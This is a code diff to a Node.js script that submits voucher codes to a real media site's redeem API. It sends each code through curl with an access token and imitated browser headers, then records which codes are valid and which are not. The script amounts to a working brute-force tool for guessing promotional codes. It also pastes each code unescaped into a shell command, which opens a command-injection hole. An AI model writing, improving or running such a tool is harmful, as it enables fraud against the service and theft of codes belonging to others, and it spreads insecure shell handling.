@@ -31,7 +31,7 @@ const fsCb = (err) => {
 
 async function runCmd(data) {
     return new Promise((resolve, reject) => {
-        const cmd = `curl 'http://api.fantom.tv/SW17/vouchers/redeem?albumKey=SW17&accessToken=${accessToken}&currentUrl=aHR0cDovL3d3dy5mYW50b20udHYvc3cxNw==' -H 'Origin: http://www.fantom.tv' -H 'Accept-Encoding: gzip, deflate' -H 'Accept-Language: es' -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36' -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' -H 'Accept: application/json, text/javascript, */*; q=0.01' -H 'Referer: http://www.fantom.tv/sw17' -H 'Connection: keep-alive' --data $'data%5BVoucher%5D%5Bcode%5D=${data}+alphabet+%3D+\'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789\'' --compressed`;
+        const cmd = `curl 'http://api.fantom.tv/SW17/vouchers/redeem?albumKey=SW17&accessToken=${accessToken}&currentUrl=aHR0cDovL3d3dy5mYW50b20udHYvc3cxNw==' -H 'Origin: http://www.fantom.tv' -H 'Accept-Encoding: gzip, deflate' -H 'Accept-Language: es' -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36' -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' -H 'Accept: application/json, text/javascript, */*; q=0.01' -H 'Referer: http://www.fantom.tv/sw17' -H 'Connection: keep-alive' --data 'data%5BVoucher%5D%5Bcode%5D=${data}' --compressed`;
         child_process.exec(cmd, (err, resp) => {
             if(err) {
                 reject(err);
@@ -54,10 +54,10 @@ async function tryVoucher(voucher) {
         result = await runCmd(voucher);
         if(result.success) {
             console.log(`✅ ${voucher}`);
-            fs.appendFile(`${outDir}validCodes.txt`, voucher + "\n", fsCb);
+            fs.appendFile(`${outDir}validCodes.txt`, `${voucher}\n`, fsCb);
         } else {
             console.log(`❎ ${voucher}`);
-            fs.appendFile(`${outDir}invalidCodes.txt`, voucher + "\n", fsCb);
+            fs.appendFile(`${outDir}invalidCodes.txt`, `${voucher}\n`, fsCb);
         }
 
         fs.writeFile(`${outDir}lastCode.txt`, voucher, fsCb);
